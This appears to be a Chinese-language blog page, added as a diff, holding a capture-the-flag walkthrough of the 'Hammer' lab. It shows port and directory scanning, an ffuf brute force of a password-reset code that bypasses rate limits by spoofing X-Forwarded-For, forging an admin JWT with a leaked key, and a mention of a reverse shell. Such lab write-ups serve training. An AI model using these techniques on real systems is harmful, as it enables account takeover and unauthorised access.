@@ -1,0 +1,192 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>aca1-de | aca1-de</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Hammer端口扫描 12345sudo nmap --min-rate 10000 -p- 10.10.74.232PORT     STATE SERVICE22&#x2F;tcp   open  ssh1337&#x2F;tcp open  waste  详细端口扫描 123456789101112131415sudo nmap -sT -sC -sV -O 10.10.74.232 -p22,1337PORT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="aca1-de">
+<meta property="og:url" content="http://example.com/2025/01/17/Hammer/index.html">
+<meta property="og:site_name" content="aca1-de">
+<meta property="og:description" content="Hammer端口扫描 12345sudo nmap --min-rate 10000 -p- 10.10.74.232PORT     STATE SERVICE22&#x2F;tcp   open  ssh1337&#x2F;tcp open  waste  详细端口扫描 123456789101112131415sudo nmap -sT -sC -sV -O 10.10.74.232 -p22,1337PORT">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-01-17T13:46:07.489Z">
+<meta property="article:modified_time" content="2025-01-17T13:45:11.658Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "url": "http://example.com/2025/01/17/Hammer/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2025-01-17T13:46:07.489Z",
+  "dateModified": "2025-01-17T13:45:11.658Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "John Doe",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/01/17/Hammer/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'aca1-de',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">aca1-de</span></a><a class="nav-page-title" href="/"><span class="site-name">aca1-de</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-17T13:46:07.489Z" title="发表于 2025-01-17 21:46:07">2025-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-17T13:45:11.658Z" title="更新于 2025-01-17 21:45:11">2025-01-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Hammer"><a href="#Hammer" class="headerlink" title="Hammer"></a>Hammer</h1><p>端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 10.10.74.232</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">1337/tcp open  waste</span><br></pre></td></tr></table></figure>
+
+<p>详细端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sC -sV -O 10.10.74.232 -p22,1337</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c5:22:9f:91:f8:6e:97:2d:14:c1:01:6c:97:59:fe:01 (RSA)</span><br><span class="line">|   256 5a:cb:12:ff:5b:0d:44:41:22:71:43:a8:3f:5b:84:48 (ECDSA)</span><br><span class="line">|_  256 5d:aa:67:cc:03:09:4d:62:86:c0:86:2c:23:6c:54:38 (ED25519)</span><br><span class="line">1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Login</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br></pre></td></tr></table></figure>
+
+<p>打开网站是一个邮箱密码登录页面</p>
+<p>还有一个密码找回的功能</p>
+<p>打开网页源代码看看</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一行注释，告诉我们路径名一定是hmr_DIRECTORY_NAME这种格式的，那就让hmr_作为前缀进行目录扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo dirsearch 10.10.74.232:1337 --prefixes hmr_</span><br><span class="line"></span><br><span class="line">301   320B   http://10.10.49.188:1337/hmr_js    -&gt; REDIRECTS TO: http://10.10.49.188:1337/hmr_js/</span><br><span class="line">301   321B   http://10.10.49.188:1337/hmr_css    -&gt; REDIRECTS TO: http://10.10.49.188:1337/hmr_css/</span><br><span class="line">301   324B   http://10.10.49.188:1337/hmr_images    -&gt; REDIRECTS TO: http://10.10.49.188:1337/hmr_images/</span><br><span class="line">200   464B   http://10.10.49.188:1337/hmr_images/</span><br><span class="line">200   470B   http://10.10.49.188:1337/hmr_js/</span><br><span class="line">301   322B   http://10.10.49.188:1337/hmr_logs    -&gt; REDIRECTS TO: http://10.10.49.188:1337/hmr_logs/</span><br><span class="line">200   462B   http://10.10.49.188:1337/hmr_logs/</span><br></pre></td></tr></table></figure>
+
+<p>打开<a target="_blank" rel="noopener" href="http://10.10.49.188:1337/hmr_logs/">http://10.10.49.188:1337/hmr_logs/</a></p>
+<p>在<a target="_blank" rel="noopener" href="http://10.10.49.188:1337/hmr_logs/error.logs%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%A6%82%E4%B8%8B%E5%86%85%E5%AE%B9">http://10.10.49.188:1337/hmr_logs/error.logs中发现如下内容</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use &#x27;LimitInternalRecursion&#x27; to increase the limit if necessary. Use &#x27;LogLevel debug&#x27; to get a backtrace.</span><br><span class="line">[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/</span><br><span class="line">[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for &quot;/restricted-area&quot;: Password Mismatch</span><br><span class="line">[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow</span><br><span class="line">[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected</span><br><span class="line">[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php</span><br><span class="line">[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for &quot;/admin-login&quot;: Invalid email address</span><br><span class="line">[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use &#x27;LimitInternalRecursion&#x27; to increase the limit if necessary. Use &#x27;LogLevel debug&#x27; to get a backtrace.</span><br><span class="line">[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现一个邮箱，尝试找回密码</p>
+<p>发现是通过一个四位数验证码来进行的身份</p>
+<p>在bp里研究之后发现会对验证码的尝试次数有限制，但是从不同的IP地址发出的相同请求是可以重置该限制的，并且是不会对IP经行验证的，那就直接进行爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">生成验证码字典</span><br><span class="line">seq -w 0000 9999 &gt;&gt; codes.txt</span><br><span class="line">爆破</span><br><span class="line">ffuf -u http://10.10.74.232:1337/reset_password.php -w codes.txt -X &quot;POST&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -H &quot;X-Forwarded-For: FUZZ&quot; -H &quot;Cookie: PHPSESSID=drbe3iikr8i168uigqgtmtqh3l&quot; -d &quot;recovery_code=FUZZ&quot; -fr &quot;Invalid&quot;</span><br></pre></td></tr></table></figure>
+
+<p>拿到验证码之后重置密码，再次登录</p>
+<p>看到我们的角色为user，并且可以命令执行,但多次尝试之后发现好像只有ls可以执行，并且注意到页面每隔一段时间就会自动登出，查看源代码后发现它会检查persistentSession的值是否为true，如果值为no就会登出，我们可以在localstorage中将其手动更改为true，或者在bp中测试</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line"></span><br><span class="line">188ade1.key</span><br><span class="line">composer.json</span><br><span class="line">config.php</span><br><span class="line">dashboard.php</span><br><span class="line">execute_command.php</span><br><span class="line">hmr_css</span><br><span class="line">hmr_images</span><br><span class="line">hmr_js</span><br><span class="line">hmr_logs</span><br><span class="line">index.php</span><br><span class="line">logout.php</span><br><span class="line">reset_password.php</span><br><span class="line">vendor</span><br></pre></td></tr></table></figure>
+
+<p>直接访问网址<a target="_blank" rel="noopener" href="http://10.10.74.232:1337/188ade1.key%E5%B0%86188ade1.key%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%EF%BC%8C%E6%89%93%E5%BC%80%E6%8B%BF%E5%88%B0%E5%AF%86%E9%92%A556058354efb3daa97ebab00fabd7a7d7">http://10.10.74.232:1337/188ade1.key将188ade1.key下载下来，打开拿到密钥56058354efb3daa97ebab00fabd7a7d7</a></p>
+<p>猜测其为jwt的密钥，在<a target="_blank" rel="noopener" href="https://jwt.io/%E4%B8%AD%E4%BF%AE%E6%94%B9jwt%E4%BB%A4%E7%89%8C%EF%BC%8C%E4%BD%BFrole%E4%B8%BAadmin%EF%BC%8C%E5%B9%B6%E5%A1%AB%E5%86%99%E5%AF%86%E9%92%A5">https://jwt.io/中修改jwt令牌，使role为admin，并填写密钥</a></p>
+<p>将新拿到的token替换掉原先的，再执行其他命令即可成功</p>
+<p>最后反弹shell，拿到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/17/Hammer/">http://example.com/2025/01/17/Hammer/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">aca1-de</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/01/15/FunboxEasy/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">FunboxEasy端口扫描 12345nmap 192.168.53.111PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http  目录扫描 123456789101112131415161718192021222324252627dirb http://192.168.53.111---- Scanning URL: http://192.168.53.111/ ----==&gt; DIRECTORY: http://192.168.53.111/admin/                                                  + http://192.168.53.111/index.html (CODE:200|SIZE:10918)                                     + http://192.168.53.111/index.php (CODE:200|SIZE:3468)                                     ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">John Doe</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hammer"><span class="toc-number">1.</span> <span class="toc-text">Hammer</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/17/Hammer/" title="无标题">无标题</a><time datetime="2025-01-17T13:46:07.489Z" title="发表于 2025-01-17 21:46:07">2025-01-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/15/FunboxEasy/" title="无标题">无标题</a><time datetime="2025-01-15T09:21:46.775Z" title="发表于 2025-01-15 17:21:46">2025-01-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By John Doe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
